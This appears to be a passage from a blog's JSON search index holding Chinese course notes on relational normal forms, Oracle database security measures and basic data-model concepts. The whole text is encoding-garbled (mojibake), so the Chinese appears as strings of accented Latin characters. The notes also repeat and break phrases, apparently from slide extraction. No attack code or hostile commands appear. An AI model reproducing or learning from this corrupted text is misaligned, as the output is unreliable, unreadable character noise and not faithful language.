Ræ˜¯BCNFã€‚Rå€™é€‰å…³é”®å­—ä¸ºXYï¼ŒFä¸­åªæœ‰ä¸€ä¸ªå‡½æ•°ä¾èµ–ï¼Œè€Œè¯¥å‡½æ•°ä¾èµ–çš„å·¦éƒ¨åŒ…å«äº†Rçš„å€™é€‰å…³é”®å­—ã€‚ (2) Ræ˜¯3NFã€‚Rå€™é€‰å…³é”®å­—ä¸ºX Yå’ŒXZï¼ŒRä¸­æ‰€æœ‰å±æ€§éƒ½æ˜¯ä¸»å±æ€§ï¼Œä¸å­˜åœ¨éä¸»å±æ€§å¯¹å€™é€‰å…³é”®å­—çš„ä¼ é€’ä¾èµ–ã€‚ (3) Ræ˜¯BCNFã€‚Rå€™é€‰å…³é”®å­—ä¸ºXå’ŒYï¼Œå› ä¸ºXâ†’YZï¼Œæ‰€ä»¥Xâ†’Yï¼ŒXâ†’Zï¼Œç”±äºFä¸­æœ‰Yâ†’Zï¼ŒYâ†’Xï¼Œå› æ­¤Zæ˜¯ç›´æ¥å‡½æ•°ä¾èµ–äºXï¼Œè€Œä¸æ˜¯ä¼ é€’ä¾èµ–äºXã€‚åˆå› ä¸ºFçš„æ¯ä¸€å‡½æ•°ä¾èµ–çš„å·¦éƒ¨éƒ½åŒ…å«äº†ä»»ä¸€å€™é€‰å…³é”®å­—ï¼Œæ‰€ä»¥Ræ˜¯BCNFã€‚ (4) Ræ˜¯BCNFã€‚Rå€™é€‰å…³é”®å­—ä¸ºXï¼Œè€Œä¸”Fä¸­æ¯ä¸€ä¸ªå‡½æ•°ä¾èµ–çš„å·¦éƒ¨åŒ…å«äº†å€™é€‰å…³é”®å­—Xã€‚ (5) Ræ˜¯1NFã€‚Rå€™é€‰å…³é”®å­—ä¸ºWXï¼Œåˆ™Yï¼ŒZä¸ºéä¸»å±æ€§ï¼Œåˆç”±äºXâ†’Zï¼Œå› æ­¤Fä¸­å­˜åœ¨éä¸»å±æ€§å¯¹å€™é€‰å…³é”®å­—çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"æ•°æ®åº“å®‰å…¨","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/ç¬¬10å‘¨è¯¾/","text":"ç¬¬åå‘¨è¯¾æ•°æ®åº“å®‰å…¨æ•°æ®åº“å®‰å…¨ æ•°æ®åº“å®‰å…¨æªæ–½1.ç”¨æˆ·æ ‡è¯†å’Œé‰´å®š ç”¨æˆ·åå’Œç”¨æˆ·æ ‡è¯†æ ‡æ˜ç”¨æˆ·èº«ä»½ å£ä»¤ éšæœºæ•°å¯¹å¯†ç åŠ å¯† 2.å­˜å–æ§åˆ¶ æ ¹æ®é¢„å…ˆå®šä¹‰å¥½çš„ç”¨æˆ·æƒé™è¿›è¡Œå­˜å–æ§åˆ¶ ä¸¤éƒ¨åˆ†:æ•°æ®å¯¹è±¡å’Œæ“ä½œç±»å‹ 3.è§†å›¾ ä¿è¯ç¨‹åºçš„é€»è¾‘ç‹¬ç«‹æ€§,å°†æœºå¯†æ•°æ®éšè—èµ·æ¥ ä¸åŒçš„DBMSéƒ½æä¾›äº†å»ºç«‹è§†å›¾çš„æœºåˆ¶ å¼€å‘æ•°æ®ç³»ç»Ÿæ—¶,åº”å°½å¯èƒ½ç»™ä¸åŒç”¨æˆ·åˆ†é…ä¸åŒçš„è§†å›¾ 4.å®¡è®¡ å®¡è®¡æ—¶ä¸€ç§é¢„é˜²æ‰‹æ®µ,ç›‘æµ‹å¯èƒ½çš„ä¸åˆæ³•è®¿é—® å®¡è®¯è¿½è¸ªæŠ€æœ¯ä½¿ç”¨ä¸“é—¨çš„æ–‡ä»¶æˆ–æ•°æ®åº“è®¿é—®è‡ªåŠ¨è®°å½•ç”¨æˆ·å¯¹æ•°æ®åº“çš„æ‰€æœ‰æ“ä½œ,åˆ©ç”¨è¿™äº›ä¿¡æ¯å°±èƒ½æ‰¾å‡ºéæ³•å­˜å–æ•°æ®çš„äºº 5.æ•°æ®åŠ å¯† ORACLEä¸­çš„è§’è‰²ã€ç”¨æˆ·ã€æƒé™è§’è‰²åˆ†ç±» ç”¨æˆ·ç±»å‹ åº”ç”¨ç±»å‹ oracleé¢„å®šä¹‰çš„è§’è‰² oracleå…è®¸DBAå®šä¹‰è§’è‰² CONNECT RESOURCE DBA æ•°æ®åº“å®Œæ•´æªæ–½è§¦å‘å™¨","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"Oracleæ•°æ®åº“ç¬¬äºŒå‘¨","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/ç¬¬2å‘¨è¯¾/","text":"Oracleæ•°æ®åº“ç¬¬äºŒå‘¨1.1æ•°æ®ã€ä¿¡æ¯ä¸æ•°æ®å¤„ç† æ•°æ®å’Œä¿¡æ¯ æ•°æ®åº“å’Œæ•°æ®åº“è¡¨ æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ æ•°æ®åº“ç³»ç»Ÿ 1.1åŸºæœ¬æ¦‚å¿µ 1.æ•°æ® **æ•°æ®(Data)**ï¼šæ˜¯æ•°æ®åº“ä¸­å­˜å‚¨çš„åŸºæœ¬å¯¹è±¡ æ•°æ®çš„å®šä¹‰ï¼šæè¿°äº‹ç‰©çš„ç¬¦å·è®°å½•ï¼Œæ˜¯ä¿¡æ¯çš„ç¬¦å·è¡¨ç¤ºï¼Œæˆ–ç§°è½½ä½“ æ•°æ®çš„ç§ç±»ï¼šæ•°å­—ã€æ–‡æœ¬ã€å›¾å½¢ã€å›¾åƒã€å£° ï¼šæ•°å­—ã€æ–‡æœ¬ã€å›¾å½¢ã€å›¾åƒã€å£°éŸ³ã€è§†é¢‘ã€å­¦ç”Ÿçš„æ¡£æ¡ˆè®°å½•ç­‰ ä¿¡æ¯ï¼šæ•°æ®çš„å†…æ¶µï¼Œæ˜¯æ•°æ®çš„è¯­ä¹‰è§£é‡Š æ•°æ®å¤„ç†:å°†æ•°æ®è½¬æ¢æˆä¿¡æ¯çš„è¿‡ç¨‹ï¼ŒåŒ…æ‹¬å¯¹æ•°æ®æ”¶é›†ã€å­˜å‚¨ã€åˆ†ç±»ã€åŠ å·¥ã€æ£€ç´¢ã€ç»´æŠ¤ç­‰ä¸€ç³»åˆ—æ´»åŠ¨ æ€»ç»“ï¼š æ•°æ®æ˜¯ä¿¡æ¯çš„è½½ä½“ æ•°æ®æ˜¯ä¿¡æ¯çš„è½½ä½“ æ•°æ®æ˜¯ä¿¡æ¯çš„è¡¨è¿°æ–¹å¼ æ•°æ®æ˜¯ä¿¡æ¯çš„è¡¨è¿°æ–¹å¼ ä¿¡æ¯æ˜¯ä»æ•°æ®è€Œæ¥çš„ ä¿¡æ¯æ˜¯ä»æ•°æ®è€Œæ¥çš„çŸ¥è¯† 2.æ•°æ®åº“ **æ•°æ®åº“(Database,ç®€ç§° ç®€ç§°DB)**ï¼šæ˜¯é•¿æœŸå‚¨å­˜åœ¨è®¡ç®—æœºå†…ã€æœ‰ç»„ç»‡ã€å¯å…±äº«çš„å¤§é‡æ•°æ®çš„é›†åˆ åŸºæœ¬ç‰¹å¾ï¼š æ•°æ®æŒ‰ä¸€å®šçš„æ•°æ®æ¨¡å‹ç»„ç»‡ã€æè¿°å’Œå‚¨å­˜ ä»¥æ–‡ä»¶æ–¹å¼å­˜å‚¨ï¼Œå¸¸è§æ•°æ®åº“æ–‡ä»¶æ‰©å±•åï¼š MDF-SQL Serverï¼› MDB-Accessï¼› 1- DBC-VFPï¼ˆVisual FoxProï¼‰ å¯ä¸ºå„ç§ç”¨æˆ·å…±äº« å†—ä½™åº¦è¾ƒå° æ•°æ®ç‹¬ç«‹æ€§è¾ƒé«˜ æ˜“æ‰©å±• 3.æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ **æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆ æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDatabase Management Systemï¼Œç®€ç§° ç®€ç§°DBMSï¼‰ ** ç®¡ç†æ•°æ®åº“çš„ ç®¡ç†æ•°æ®åº“çš„ç³»ç»Ÿè½¯ä»¶ ç³»ç»Ÿè½¯ä»¶ï¼Œæ˜¯æ•°æ®åº“ç³»ç»Ÿçš„æ ¸å¿ƒ ä½äºç”¨æˆ·ä¸æ“ä½œç³»ç»Ÿä¹‹é—´çš„ä¸€å±‚æ•°æ®ç®¡ç†è½¯ä»¶ ä¸»è¦åŠŸèƒ½ï¼š æ•°æ®å®šä¹‰åŠŸèƒ½ï¼ˆDDLï¼‰ æ•°æ®æ“çºµåŠŸèƒ½ï¼ˆDMLï¼‰ï¼šCRUD æ•°æ®åº“çš„äº‹åŠ¡ç®¡ç†å’Œè¿è¡Œç®¡ç† æ•°æ®åº“çš„å»ºç«‹å’Œç»´æŠ¤åŠŸèƒ½ 1.2æ•°æ®ç®¡ç†æŠ€æœ¯çš„å‘å±•æ–°ä¸€ä»£æ•°æ®åº“ é¢å‘å¯¹è±¡çš„æ•°æ®åº“ åˆ†å¸ƒå¼æ•°æ®åº“ å¹¶è¡Œæ•°æ®åº“ å›¾å½¢å›¾åƒæ•°æ®åº“ ä¸»æµæ•°æ®åº“ï¼šOracleå…¬å¸ï¼šOracleã€MySQLï¼ˆå¼€æºï¼‰ Microsoftå…¬å¸ï¼šMicrosoft SQL Server MySQLåˆ†æ”¯ï¼šMariaDBï¼ˆå¼€æºï¼‰ å‚è€ƒé“¾æ¥ï¼š ä¸€å›¾çœ‹æ•°æ®åº“å‘å±•å†å² æ•°æ®åº“æ’å 1.3æ•°æ®åº“ç³»ç»Ÿçš„ç»„æˆæ•°æ®åº“ç³»ç»Ÿ1.4æ¨¡å‹æ ¹æ®åº”ç”¨ç›®çš„ï¼Œæ¨¡å‹åˆ†ä¸ºä¸¤ä¸ªå±‚æ¬¡ï¼š æ¦‚å¿µæ¨¡å‹ æŒ‰ç”¨æˆ·çš„è§‚ç‚¹ï¼Œç‹¬ç«‹äºè®¡ç®—æœºå®ç°çš„ï¼Œåªç”¨æ¥æè¿°å’Œç»„ç»‡æ‰€å…³å¿ƒçš„ä¿¡æ¯ç»“æ„çš„æ¦‚å¿µæ•°æ®æ¨¡å‹ï¼Œå¼ºè°ƒè¯­ä¹‰ æ•°æ®åº“è®¾è®¡äººå‘˜å’Œç”¨æˆ·ä¹‹é—´è¿›è¡Œäº¤æµçš„è¯­è¨€ å¯¹åº”äºä¿¡æ¯ä¸–ç•Œ æ¦‚å¿µæ¨¡å‹ç”¨äºä¿¡æ¯ä¸–ç•Œçš„å»ºæ¨¡ï¼› æ˜¯ç°å®ä¸–ç•Œåˆ°æœºå™¨ä¸–ç•Œçš„ç¬¬ä¸€å±‚æŠ½è±¡ï¼› æ˜¯æ•°æ®åº“è®¾è®¡çš„æœ‰åŠ›å·¥å…·ï¼› æ•°æ®åº“è®¾è®¡äººå‘˜å’Œç”¨æˆ·ä¹‹é—´è¿›è¡Œäº¤æµçš„è¯­è¨€ï¼› æ•°æ®æ¨¡å‹ æŒ‰è®¡ç®—æœºç³»ç»Ÿçš„è§‚ç‚¹ï¼Œç›´æ¥é¢å‘è®¡ç®—æœºç³»ç»Ÿçš„ï¼Œæè¿°æ•°æ®åº“ä¸­æ•°æ®çš„é€»è¾‘ç»“æ„çš„åŸºæœ¬æ•°æ®æ¨¡å‹ å¯¹åº”äºæ•°æ®ä¸–ç•Œï¼ˆæœºå™¨ä¸–ç•Œï¼‰ åŒ…æ‹¬é€»è¾‘æ¨¡å‹å’Œç‰©ç†æ¨¡å‹ é€»è¾‘æ¨¡å‹ï¼šé‡‡ç”¨æŸä¸€æ•°æ®æ¨¡å‹ç»„ç»‡æ•°æ®ï¼Œå¦‚å…³ç³»æ¨¡å‹ã€‚ ç‰©ç†æ¨¡å‹ï¼šæè¿°æ•°æ®åœ¨ç³»ç»Ÿå†…éƒ¨çš„è¡¨ç¤ºæ–¹å¼å’Œå­˜å–æ–¹æ³• ç”¨æ¥å½¢å¼åŒ–æè¿° æ•°æ® æ•°æ®ä¹‹é—´çš„è”ç³» æ•°æ®è¯­ä¹‰å’Œçº¦æŸè§„åˆ™ æ•°æ®æ¨¡å‹çš„ç»„æˆè¦ç´  æ•°æ®ç»“æ„ æ•°æ®ç»“æ„çš„æ¦‚å¿µ æè¿°æ•°æ®åº“çš„ç»„æˆå¯¹è±¡ï¼Œä»¥åŠå¯¹è±¡ä¹‹é—´çš„è”ç³» æ•°æ®ç»“æ„æè¿°çš„å†…å®¹ å¯¹è±¡çš„æ•°æ®ç±»å‹ã€å†…å®¹ã€æ€§è´¨ï¼Œå¦‚å…³ç³»æ¨¡å‹ä¸­çš„å±æ€§ ä¸æ•°æ®ä¹‹é—´è”ç³»æœ‰å…³çš„å¯¹è±¡ æ•°æ®æ“ä½œ å¯¹æ•°æ®åº“ä¸­å„ç§å¯¹è±¡(å‹)çš„å®ä¾‹(å€¼)å…è®¸æ‰§è¡Œçš„æ“ä½œåŠæœ‰å…³çš„æ“ä½œè§„åˆ™ï¼Œæ˜¯å¯¹ç³»ç»ŸåŠ¨æ€ç‰¹æ€§çš„æè¿° æ•°æ®æ“ä½œçš„ç±»å‹ æŸ¥è¯¢ æ›´æ–°(åŒ…æ‹¬æ’å…¥ã€åˆ é™¤ã€ä¿®æ”¹) æ•°æ®çš„å®Œæ•´æ€§çº¦æŸ ä¸€ç»„å®Œæ•´æ€§è§„åˆ™çš„é›†åˆã€‚ å®Œæ•´æ€§è§„åˆ™ï¼šç»™å®šçš„æ•°æ®æ¨¡å‹ä¸­æ•°æ®åŠå…¶è”ç³»æ‰€å…·æœ‰çš„åˆ¶çº¦å’Œä¾å­˜è§„åˆ™ ç”¨ä»¥é™å®šç¬¦åˆæ•°æ®æ¨¡å‹çš„æ•°æ®åº“çŠ¶æ€ä»¥åŠçŠ¶æ€çš„å˜åŒ–ï¼Œä»¥ä¿è¯æ•°æ®çš„æ­£ç¡®ã€æœ‰æ•ˆã€ç›¸å®¹ã€‚ æœ€å¸¸ç”¨çš„æ•°æ®æ¨¡å‹ éå…³ç³»æ¨¡å‹ å±‚æ¬¡æ¨¡å‹(Hierarchical Model) å±‚æ¬¡æ¨¡å‹æ˜¯æ•°æ®åº“ç³»ç»Ÿä¸­æœ€æ—©å‡ºç°çš„æ•°æ®æ¨¡å‹ å±‚æ¬¡æ•°æ®åº“ç³»ç»Ÿçš„å…¸å‹ä»£è¡¨æ˜¯IBMå…¬å¸1968å¹´æ¨å‡ºçš„IMSï¼ˆInformation Management Systemï¼‰æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ å±‚æ¬¡æ¨¡å‹ç”¨æ ‘å½¢ç»“æ„æ¥è¡¨ç¤ºå„ç±»å®ä½“ä»¥åŠå®ä½“é—´çš„è”ç³» é€šè¿‡ é€šè¿‡æ ‘å½¢ç»“æ„è¡¨ç¤ºå®ä½“åŠè”ç³»ã€‚å¦‚æè¿°å­¦æ ¡ç®¡ç† å½¢ç»“æ„è¡¨ç¤ºå®ä½“åŠè”ç³»ã€‚å¦‚æè¿°å­¦æ ¡ç®¡ç†æœºæ„ã€‚ä¸ª æœºæ„ã€‚æ¯ä¸ªç»“ç‚¹ ç»“ç‚¹è¡¨ç¤ºä¸€ä¸ª è¡¨ç¤ºä¸€ä¸ªå®ä½“ï¼ˆå‹ï¼‰ å®ä½“ï¼ˆå‹ï¼‰ï¼Œç®­å¤´è¡¨ç¤º ç®­å¤´è¡¨ç¤ºå®ä½“ï¼ˆå‹ï¼‰é—´çš„è”ç³»ï¼ˆç”±çˆ¶åˆ°å­ï¼‰ã€‚ ä¸»è¦ç‰¹ç‚¹ï¼š æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªæ ¹ç»“ç‚¹ï¼›æ¯ä¸ªéæ ¹ç»“ç‚¹ éæ ¹ç»“ç‚¹æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªçˆ¶(ç›´æ¥ä¸Šå±‚)ç»“ç‚¹ã€‚å®ƒæœ€é€‚åˆè¡¨ç¤ºå®ä½“çš„ä¸€å¯¹å¤šè”ç³»ã€‚ ç½‘çŠ¶æ¨¡å‹(Network Model) å…¸å‹ä»£è¡¨æ˜¯DBTGç³»ç»Ÿï¼š 70å¹´ä»£ç”±DBTGæå‡ºçš„ä¸€ä¸ªç³»ç»Ÿæ–¹æ¡ˆ å¥ å®šäº†æ•°æ®åº“ç³»ç»Ÿçš„åŸºæœ¬æ¦‚å¿µã€æ–¹æ³•å’ŒæŠ€æœ¯ å®é™…ç³»ç»Ÿ Cullinet Software Inc.å…¬å¸çš„IDMS Univacå…¬å¸çš„DMS1100 Honeywellå…¬å¸çš„IDS/2 HPå…¬å¸çš„IMAGE é€šè¿‡ç½‘çŠ¶ç»“æ„ ç½‘çŠ¶ç»“æ„è¡¨ç¤ºå®ä½“åŠè”ç³»ã€‚â€œç½‘â€ä¸­æ¯ä¸ªç»“ç‚¹è¡¨ç¤ºä¸€ä¸ªå®ä½“(å‹)ï¼Œç»“ç‚¹ä¹‹é—´ç®­å¤´è¡¨ç¤ºå®ä½“(å‹)é—´çš„è”ç³»ã€‚ ç½‘çŠ¶æ•°æ®æ¨¡å‹ä¸»è¦ç‰¹ç‚¹ï¼šç½‘çŠ¶æ•°æ®æ¨¡å‹å¯èƒ½æœ‰å¤šä¸ªæ ¹ç»“ç‚¹ï¼ŒæŸäº›éæ ¹ç»“ç‚¹å¯èƒ½æœ‰å¤šä¸ªçˆ¶ç»“ç‚¹ï¼Œé€‚åˆè¡¨ç¤ºå®ä½“çš„å¤šå¯¹å¤šè”ç³»ã€‚ ç‰¹ç‚¹ï¼š é€‚åˆå¤æ‚çš„å…³ç³» æœ€å°‘çš„æ•°æ®å†—ä½™ ç®—æ³•å¤æ‚ã€ä¸“ç”¨ ä¼˜ç‚¹ ä¼˜ç‚¹:èƒ½ç›´è§‚ã€å½¢è±¡åœ°æè¿°å®ä½“åŠå…¶è”ç³»ï¼Œæ˜“äºè¢«äººä»¬æ‰€ç†è§£å’ŒæŒæ¡ ã€‚ ç¼ºç‚¹ ç¼ºç‚¹:æ•°æ®ç»“æ„è¾ƒå¤æ‚ï¼Œå­˜å‚¨æ•°æ®éœ€è¦æ›´å¤šçš„é“¾æ¥æŒ‡é’ˆï¼›åœ¨æ£€ç´¢æ•°æ®æ—¶ï¼Œéœ€è¦è€ƒè™‘æ•°æ®çš„å­˜å‚¨è·¯å¾„ï¼›åœ¨æ’å…¥æˆ–åˆ é™¤æ•°æ®æ—¶ï¼Œæ¶‰åŠåˆ°è°ƒæ•´é“¾æ¥æŒ‡é’ˆ å…³ç³»æ¨¡å‹(Relational Model) 1970å¹´ç¾å›½IBMå…¬å¸San Joseç ”ç©¶å®¤çš„ç ”ç©¶å‘˜E.F.Coddé¦–æ¬¡æå‡ºäº†æ•°æ®åº“ç³»ç»Ÿçš„å…³ç³»æ¨¡å‹ å…³ç³»æ•°æ®ç»“æ„ï¼šè§„èŒƒåŒ–çš„äºŒç»´è¡¨ äºŒç»´è¡¨ï¼ˆå…³ç³»ï¼‰ ä¸€ä¸ªå…³ç³»å°±æ˜¯æ²¡æœ‰é‡å¤è¡Œå’Œé‡å¤åˆ—çš„äºŒç»´è¡¨ï¼ŒäºŒç»´è¡¨çš„æ¯ä¸€è¡Œåœ¨å…³ç³»ä¸­ç§°ä¸ºå…ƒç»„ï¼Œæ¯ä¸€åˆ—åœ¨å…³ç³»ä¸­ç§°ä¸ºå±æ€§ã€‚å­¦ç”Ÿå…³ç³»çš„æ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ªå­¦ç”Ÿçš„è®°å½•ï¼Œæ¯ä¸€åˆ—ä»£è¡¨å­¦ç”Ÿè®°å½•çš„ä¸€ä¸ªå­—æ®µã€‚å±æ€§ä¸ªæ•°ï¼ˆnï¼‰ç§°ä¸ºå…³ç³»çš„å…ƒã€‚ å…³ç³»æ¨¡å‹çš„ç»„æˆ å…³ç³»æ•°æ®ç»“æ„ å•ä¸€çš„æ•°æ®ç»“æ„â€”-å…³ç³» ç°å®ä¸–ç•Œçš„å®ä½“ä»¥åŠå®ä½“é—´çš„å„ç§è”ç³»å‡ç”¨å…³ç³»æ¥è¡¨ç¤º æ•°æ®çš„é€»è¾‘ç»“æ„â€”-äºŒç»´è¡¨ ä»ç”¨æˆ·è§’åº¦ï¼Œå…³ç³»æ¨¡å‹ä¸­æ•°æ®çš„é€»è¾‘ç»“æ„æ˜¯ä¸€å¼ äºŒç»´è¡¨ã€‚ å…³ç³»æ“ä½œé›†åˆ æ’å…¥ã€åˆ é™¤ã€ä¿®æ”¹ã€æŸ¥è¯¢ï¼ˆé€‰æ‹©ã€æŠ•å½±ã€è¿æ¥ã€é™¤ã€å¹¶ã€äº¤ã€å·® å…³ç³»å®Œæ•´æ€§çº¦æŸ å®ä½“å®Œæ•´æ€§ã€å‚ç…§å®Œæ•´æ€§ã€åŸŸå®Œæ•´æ€§ã€ç”¨æˆ·å®šä¹‰å®Œæ•´æ€§ å…³ç³»æ•°æ®åº“å°±æ˜¯ä¸€äº›ç›¸å…³çš„äºŒç»´è¡¨å’Œå…¶ä»–æ•°æ®åº“å¯¹è±¡çš„é›†åˆã€‚ åœ¨è¿™ä¸ªå®šä¹‰ä¸­æ˜ç¡®ï¼Œå…³ç³»æ•°æ®åº“ä¸­çš„æ‰€æœ‰ä¿¡æ¯éƒ½å­˜å‚¨åœ¨äºŒç»´è¡¨æ ¼ä¸­ï¼›ä¸€ä¸ªå…³ç³»æ•°æ®åº“å¯èƒ½åŒ…å«å¤šä¸ªè¡¨ï¼›é™¤äº†è¿™ç§äºŒç»´è¡¨å¤–ï¼Œå…³ç³»æ•°æ®åº“è¿˜åŒ…å«ä¸€äº›å…¶ä»–å¯¹è±¡ï¼Œå¦‚è§†å›¾ç­‰ã€‚ æ¦‚å¿µ å…³ç³» æ˜¯ä¸€å¼ äºŒç»´è¡¨ï¼Œé€šå¸¸å°†ä¸€ä¸ªæ— é‡å¤è¡Œã€é‡å¤åˆ—çš„äºŒç»´è¡¨çœ‹æˆä¸€ä¸ªå…³ç³»ï¼Œæ¯ä¸ªå…³ç³»éƒ½æœ‰ä¸€ä¸ªå…³ç³»åã€‚ å…ƒç»„ äºŒç»´è¡¨çš„æ¯ä¸€è¡Œåœ¨å…³ç³»ä¸­ç§°ä¸ºå…ƒç»„ã€‚æè¿°äº†ç°å®ä¸–ç•Œä¸­çš„ä¸€ä¸ªå®ä½“æˆ–ä¸åŒå®ä½“é—´çš„ä¸€ç§è”ç³»ã€‚ å±æ€§ äºŒç»´è¡¨çš„æ¯ä¸€åˆ—åœ¨å…³ç³»ä¸­ç§°ä¸ºå±æ€§ï¼Œæ¯ä¸ªå±æ€§éƒ½æœ‰ä¸€ä¸ªå±æ€§åï¼Œå„ä¸ªå±æ€§çš„å–å€¼ç§°ä¸ºå±æ€§å€¼ã€‚æ¯ä¸ªå±æ€§æœ‰ä¸€å®šçš„å–å€¼èŒƒå›´ï¼Œç§°ä¸ºå€¼åŸŸã€‚ åŸŸ ï¼ˆDomainï¼‰ å…³ç³»ä¸­æ¯ä¸ªå±æ€§çš„å€¼æ˜¯æœ‰ä¸€å®šå˜åŒ–èŒƒå›´ï¼Œæ¯ä¸€ä¸ªå±æ€§æ‰€å¯¹åº”çš„å˜åŒ–èŒƒå›´å«åšå±æ€§çš„å˜åŸŸæˆ–ç®€ç§°åŸŸï¼Œå®ƒæ˜¯å±æ€§å€¼çš„é›†åˆï¼Œå…³ç³»ä¸­æ‰€æœ‰å±æ€§çš„å®é™…å–å€¼å¿…é¡»æ¥è‡ªäºå®ƒå¯¹åº”çš„åŸŸã€‚ åˆ†é‡ ä¸€ä¸ªå…ƒç»„åœ¨ä¸€ä¸ªå±æ€§åŸŸä¸Šçš„å–å€¼ç§°ä¸ºè¯¥å…ƒç»„åœ¨æ­¤å±æ€§ä¸Šçš„åˆ†é‡ã€‚ å…³ç³»æ¨¡å¼ äºŒç»´è¡¨çš„è¡¨å¤´é‚£ä¸€è¡Œç§°ä¸ºå…³ç³»æ¨¡å¼ å…³ç³»æ¨¡å¼ï¼Œå³ä¸€ä¸ªå…³ç³»çš„å…³ç³»ååŠå…¶å…¨éƒ¨å±æ€§åçš„é›†åˆã€‚å…³ç³»æ¨¡å¼æ˜¯æ¦‚å¿µæ¨¡å‹ä¸­å®ä½“å‹åŠå®ä½“å‹ä¹‹é—´è”ç³»çš„æ•°æ®æ¨¡å‹è¡¨ç¤ºã€‚ ä¸€èˆ¬è¡¨ç¤ºä¸ºï¼šå…³ç³»åï¼ˆå±æ€§å1ï¼Œå±æ€§å2 ï¼Œâ€¦â€¦ï¼Œå±æ€§ånï¼‰ å…³ç³»æ¨¡å¼æŒ‡å‡ºäº†ä¸€ä¸ªå…³ç³»çš„ç»“æ„ï¼›è€Œå…³ç³»åˆ™æ˜¯ç”±æ»¡è¶³å…³ç³»æ¨¡å¼ç»“æ„çš„å…ƒç»„æ„æˆçš„é›†åˆã€‚å…³ç³»æ¨¡å¼æ˜¯ç¨³å®šçš„ã€é™æ€çš„ï¼Œè€Œå…³ç³»åˆ™æ˜¯éšæ—¶é—´å˜åŒ–çš„ã€åŠ¨æ€çš„ã€‚ å€™é€‰ç  è‹¥å…³ç³»ä¸­çš„æŸä¸€å±æ€§æˆ–å±æ€§ç»„åˆçš„å€¼èƒ½å”¯ä¸€åœ°æ ‡è¯†ä¸€ä¸ªå…ƒç»„ï¼Œåˆ™ç§°è¯¥å±æ€§ç»„ä¸ºå€™é€‰ç  åœ¨æœ€ç®€å•çš„æƒ…å†µä¸‹ï¼Œå€™é€‰ç åªåŒ…å«ä¸€ä¸ªå±æ€§ã€‚ åœ¨æœ€æç«¯çš„æƒ…å†µä¸‹ï¼Œå…³ç³»æ¨¡å¼çš„æ‰€æœ‰å±æ€§ç»„æ˜¯è¿™ä¸ªå…³ç³»æ¨¡å¼çš„å€™é€‰ç ï¼Œç§°ä¸ºå…¨ç ï¼ˆAll-keyï¼‰ ä¸»ç ï¼ˆä¸»é”®ï¼‰ï¼ˆPrimary keyï¼‰ è‹¥ä¸€ä¸ªå…³ç³»æœ‰å¤šä¸ªå€™é€‰ç ï¼Œåˆ™é€‰å®šå…¶ä¸­ä¸€ä¸ªä¸ºä¸»ç ï¼ˆPrimary keyï¼‰ ä¸»ç çš„å„ä¸ªå±æ€§ç§°ä¸ºä¸»å±æ€§ï¼ˆPrime attributeï¼‰ ä¸åŒ…å«åœ¨ä»»ä½•ä¾¯é€‰ç ä¸­çš„å±æ€§ç§°ä¸ºéä¸»å±æ€§ï¼ˆNon-key attributeï¼‰ å¤–ç ï¼ˆå¤–é”®ï¼‰(Foreign Key) å¦‚æœå…³ç³»ä¸­æŸä¸ªå±æ€§æˆ–å±æ€§ç»„åˆå¹¶éç ï¼Œä½†å´æ˜¯å¦ä¸€ä¸ªå…³ç³»çš„ä¸»ç ï¼Œåˆ™ç§°æ­¤å±æ€§æˆ–å±æ€§ç»„åˆä¸ºæœ¬å…³ç³»çš„å¤–ç æˆ–å¤–é”®(Foreign Key)ã€‚åœ¨å…³ç³»æ•°æ®åº“ä¸­ï¼Œç”¨å¤–ç è¡¨ç¤ºä¸¤ä¸ªè¡¨é—´çš„è”ç³»ã€‚ åŸºæœ¬ç‰¹å¾ æœ‰åšå®çš„ç†è®ºåŸºç¡€ ï¼ˆå…³ç³»ä»£æ•°ï¼‰ å‡ ä¸ªå…ƒç´ ç»„æˆçš„ä¸€ä¸ªæœ‰åºç»„ç§°ä¸ºä¸€ä¸ªå…ƒç»„ï¼Œé€šå¸¸å…ƒç»„æ˜¯ç”¨åœ†æ‹¬å·æ‹¬èµ·æ¥çš„ä¸€äº›å…ƒç´ è¡¨ç¤ºï¼Œå…ƒç´ é—´ä½¿ç”¨é€—å·åˆ†éš”ã€‚ ä¾‹å¦‚ (E001,é’±è¾¾ç†,ç”·,ä¸œé£è·¯78å·)æ˜¯å…ƒç»„çš„ä¾‹å­ã€‚ åœ¨å…³ç³»æ•°æ®åº“ä¸­ï¼Œå¯ä»¥æŠŠä¸€ä¸ªè¡¨çš„æ¯ä¸€è¡Œçœ‹ä½œä¸€ä¸ªå…ƒç»„ã€‚ æ•°æ®ç»“æ„ç®€å•ã€æ˜“äºç†è§£ å¯¹ç”¨æˆ·æä¾›äº†è¾ƒå…¨é¢çš„æ“ä½œæ”¯æŒ å¾—åˆ°äº†ä¼—å¤šå¼€å‘å•†çš„æ”¯æŒ 1.5æ•°æ®åº“ç³»ç»Ÿç»“æ„æ¦‚å¿µæ¨¡å‹çš„ä¸€ç§è¡¨ç¤ºæ–¹æ³• æ•°æ®åº“ç³»ç»Ÿå†…éƒ¨ç»“æ„ ä»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿè§’åº¦çœ‹ï¼Œæ•°æ®åº“ç³»ç»Ÿé€šå¸¸é‡‡ç”¨ä¸‰çº§æ¨¡å¼ç»“æ„ï¼Œæ˜¯æ•°æ®åº“ç³»ç»Ÿå†…éƒ¨çš„ç³»ç»Ÿç»“æ„ æ•°æ®åº“ç³»ç»Ÿå¤–éƒ¨ç»“æ„ 